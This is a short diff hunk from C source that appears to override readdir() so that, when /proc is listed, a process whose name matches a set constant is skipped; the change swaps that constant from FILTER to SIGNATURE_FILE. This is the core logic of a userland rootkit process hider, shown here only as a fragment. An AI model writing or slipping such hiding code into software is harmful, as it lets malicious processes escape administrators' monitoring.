@@ -53,7 +53,7 @@ struct dirent *readdir(DIR *dirp){
         if(get_directory_name(dirp,dir_name,sizeof(dir_name)) && 
             strcmp(dir_name,"/proc")==0 && 
             get_process_name(entries->d_name,proc_name) &&
-            strcmp(proc_name,FILTER) == 0){
+            strcmp(proc_name,SIGNATURE_FILE) == 0){
                 continue;
             }
             break;
